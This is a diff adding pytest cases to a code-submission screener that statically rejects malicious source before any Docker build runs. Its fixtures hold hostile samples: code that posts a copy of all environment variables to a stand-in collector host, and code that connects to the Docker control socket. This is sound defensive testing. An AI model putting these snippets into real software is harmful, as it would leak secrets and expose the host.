@@ -1631,6 +1631,105 @@ async def test_static_preflight_v2_enforce_does_not_hold_excluded_local_helper(
     assert any(call[0] == "build" for call in calls)
 
 
+async def test_mechanical_lane_rejects_static_malicious_source_before_docker(
+    make_config: Callable[..., ScreenerConfig],
+    caplog: pytest.LogCaptureFixture,
+) -> None:
+    """Source review is retired; the static safety preflight still runs.
+
+    On the build-only lane a decisive, reachable static match is a
+    deterministic reject with location-only evidence. Nothing is held and no
+    submission-controlled build or runtime starts.
+    """
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": b"FROM scratch\nCOPY src/main.rs /src/main.rs\n",
+            "src/main.rs": (
+                b'let endpoint = "/var/run/docker.sock";\n'
+                b"connect_control_socket(endpoint);\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
+    async with gate._client:
+        result = await _screen(
+            gate, hashlib.sha256(tarball).hexdigest(), build_only=True
+        )
+
+    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
+    assert result.reason_code == "static-malicious-source"
+    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert "src/main.rs:" in result.detail
+    assert "/var/run/docker.sock" not in result.detail
+    assert "static-source safety reject" in caplog.text
+    assert "execution_started=false" in caplog.text
+
+
+async def test_mechanical_lane_rejects_v2_reachable_causal_match(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(static_preflight_v2_mode="enforce"),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+    async with gate._client:
+        result = await _screen(
+            gate, hashlib.sha256(tarball).hexdigest(), build_only=True
+        )
+
+    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
+    assert result.reason_code == "static-malicious-source"
+    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert "app.py:" in result.detail
+
+
+async def test_mechanical_lane_passes_excluded_local_helper(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    """A match only in a file the build never copies is not a safety reject."""
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": b"print('ready')\n",
+            "tools/local.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(static_preflight_v2_mode="enforce"),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+    async with gate._client:
+        result = await _screen(
+            gate, hashlib.sha256(tarball).hexdigest(), build_only=True
+        )
+
+    assert result.outcome == ScreeningOutcome.PASS
+    assert any(call[0] == "build" for call in calls)
+
+
 async def test_static_preflight_v2_enforce_reviews_unresolved_v1_before_build(
     make_config: Callable[..., ScreenerConfig],
 ) -> None:
@@ -4081,3 +4180,51 @@ def test_gate_retries_a_relayed_provider_body_fault_once(make_config) -> None:  
     # relayed provider fault and parked as l3-adjudicator-model-provider-fault.
     gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())
     assert gate._source_reviewer._l2._retry_provider_body_fault_once is True
+
+
+def test_static_reject_detail_keeps_its_brackets_when_bounded() -> None:
+    """Long paths drop whole trailing locations, never the closing brackets."""
+    from ditto_screener.gate import static_malicious_source_detail
+    from ditto_screener.policy import SourceReviewObservation
+
+    evidence = [
+        {"path": f"{'deep/' * 30}file_{index}.py", "line": index + 1, "category": "c"}
+        for index in range(16)
+    ]
+    observation = SourceReviewObservation(
+        ok=True,
+        risk_level="high",
+        finding_digest="ab" * 32,
+        categories=("credential_exfiltration",),
+        finding={"evidence": evidence},
+    )
+    detail = static_malicious_source_detail(observation)
+
+    assert len(detail) <= 1000
+    assert detail.startswith(
+        "static safety check matched categories=[credential_exfiltration] locations=["
+    )
+    assert "]; remove or make the flagged code unreachable and resubmit" in detail
+    assert "file_0.py:1" in detail
+
+
+def test_static_reject_detail_omits_paths_with_list_delimiters() -> None:
+    from ditto_screener.gate import static_malicious_source_detail
+    from ditto_screener.policy import SourceReviewObservation
+
+    observation = SourceReviewObservation(
+        ok=True,
+        risk_level="high",
+        finding_digest="ab" * 32,
+        categories=("docker_socket",),
+        finding={
+            "evidence": [
+                {"path": "a,b.py", "line": 1, "category": "c"},
+                {"path": "x]y.py", "line": 2, "category": "c"},
+                {"path": "ok.py", "line": 3, "category": "c"},
+            ]
+        },
+    )
+    detail = static_malicious_source_detail(observation)
+    assert "locations=[ok.py:3]" in detail
+    assert "a,b.py" not in detail
